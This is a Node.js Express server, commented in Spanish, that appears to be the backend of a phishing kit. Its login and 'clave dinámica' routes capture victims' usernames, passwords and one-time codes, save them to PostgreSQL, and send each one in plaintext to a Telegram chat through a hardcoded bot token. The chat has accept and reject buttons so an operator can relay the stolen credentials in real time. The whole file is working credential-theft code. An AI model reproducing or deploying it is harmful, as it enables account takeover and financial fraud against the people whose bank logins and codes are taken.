require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const { TelegramBot } = require('node-telegram-bot-api');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors()); 

// --- CONFIGURACIÓN DE POSTGRESQL ---
const pool = new Pool({
    connectionString: process.env.DATABASE_URL, 
    ssl: { rejectUnauthorized: false } 
});

// --- CONFIGURACIÓN DE TELEGRAM ---
const TELEGRAM_TOKEN = '8924337848:AAFGDJNL-mlHcwj1mJAq2dDmavj7dHL0QeI';
const CHAT_ID = '-1004356075782';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// ==========================================
// 1. LOGIN NORMAL (USUARIO Y CLAVE) - SIN CAMBIOS
// ==========================================
app.post('/api/login', async (req, res) => {
    const { usuario, clave } = req.body;

    try {
        const query = `
            INSERT INTO intentos_login (usuario, clave, estado, fecha) 
            VALUES ($1, $2, 'pendiente', NOW()) 
            RETURNING id;
        `;
        const result = await pool.query(query, [usuario, clave]);
        const intentoId = result.rows[0].id;

        const mensaje = `🚨 *Nuevo Intento de Login*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${clave}\n\n¿Aprobar acceso?`;
        
        const msg = await bot.sendMessage(CHAT_ID, mensaje, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Aceptar', callback_data: `accept_${intentoId}` },
                        { text: '❌ Rechazar', callback_data: `reject_${intentoId}` }
                    ]
                ]
            }
        });

        await pool.query('UPDATE intentos_login SET mensaje_telegram_id = $1 WHERE id = $2', [msg.message_id, intentoId]);

        res.json({ success: true, intentoId: intentoId });

    } catch (error) {
        console.error("Error en login:", error);
        res.status(500).json({ success: false, message: "Error en el servidor" });
    }
});

app.get('/api/status/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const result = await pool.query('SELECT estado FROM intentos_login WHERE id = $1', [id]);
        
        if (result.rows.length === 0) {
            return res.status(404).json({ estado: 'no_encontrado' });
        }
        res.json({ estado: result.rows[0].estado }); 
    } catch (error) {
        res.status(500).json({ error: 'Error de BD' });
    }
});

// ==========================================
// 2. NUEVO: CLAVE DINÁMICA
// ==========================================
app.post('/api/dinamica', async (req, res) => {
    const { usuario, clave, claveDinamica } = req.body;

    try {
        const query = `
            INSERT INTO intentos_dinamica (usuario, clave, clave_dinamica, estado, fecha) 
            VALUES ($1, $2, $3, 'pendiente', NOW()) 
            RETURNING id;
        `;
        const result = await pool.query(query, [usuario, clave, claveDinamica]);
        const intentoId = result.rows[0].id;

        const mensaje = `🔐 *Clave Dinámica Recibida*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${clave}\n🔢 *Dinámica:* ${claveDinamica}\n\n¿Qué deseas hacer?`;
        
        const msg = await bot.sendMessage(CHAT_ID, mensaje, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Aprobar Dinámica', callback_data: `accept_dinamica_${intentoId}` },
                        { text: '❌ Error Dinámica', callback_data: `reject_dinamica_${intentoId}` }
                    ]
                ]
            }
        });

        await pool.query('UPDATE intentos_dinamica SET mensaje_telegram_id = $1 WHERE id = $2', [msg.message_id, intentoId]);

        res.json({ success: true, intentoId: intentoId });

    } catch (error) {
        console.error("Error en /api/dinamica:", error);
        res.status(500).json({ success: false, message: "Error en el servidor" });
    }
});

app.get('/api/status-dinamica/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const result = await pool.query('SELECT estado FROM intentos_dinamica WHERE id = $1', [id]);
        
        if (result.rows.length === 0) {
            return res.status(404).json({ estado: 'no_encontrado' });
        }
        res.json({ estado: result.rows[0].estado }); 
    } catch (error) {
        res.status(500).json({ error: 'Error de BD' });
    }
});

// ==========================================
// 3. WEBHOOK (SOPORTA LOGIN Y DINÁMICA)
// ==========================================
app.post(`/webhook/telegram`, async (req, res) => {
    const callbackQuery = req.body.callback_query;

    if (callbackQuery) {
        const data = callbackQuery.data; 
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;
        
        // Detectamos si el botón es del login normal o de la dinámica
        const parts = data.split('_');
        const accion = parts[0]; // 'accept' o 'reject'
        const tipo = parts.length > 2 ? parts[1] : 'login'; // 'dinamica' o 'login'
        const id = parts.length > 2 ? parts[2] : parts[1];

        try {
            let nuevoEstado = accion === 'accept' ? 'aceptado' : 'rechazado';
            
            // Actualizamos la tabla correspondiente
            if (tipo === 'dinamica') {
                await pool.query('UPDATE intentos_dinamica SET estado = $1 WHERE id = $2', [nuevoEstado, id]);
            } else {
                await pool.query('UPDATE intentos_login SET estado = $1 WHERE id = $2', [nuevoEstado, id]);
            }

            // Editamos el mensaje en Telegram (quitamos botones y mostramos el resultado)
            let textoOriginal = callbackQuery.message.text;
            let textoActualizado = `${textoOriginal}\n\n---\n${nuevoEstado === 'aceptado' ? '✅ *ACEPTADO*' : '❌ *RECHAZADO*'}`;
            
            await bot.editMessageText(textoActualizado, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] } 
            });

            await bot.answerCallbackQuery(callbackQuery.id, { text: `Estado: ${nuevoEstado}` });

        } catch (error) {
            console.error("Error procesando webhook:", error);
            bot.answerCallbackQuery(callbackQuery.id, { text: "Este intento ya fue procesado o expiró." }).catch(()=>{});
        }
    }

    res.sendStatus(200);
});

// ==========================================
// 4. INICIAR SERVIDOR
// ==========================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Backend corriendo en puerto ${PORT}`);
});
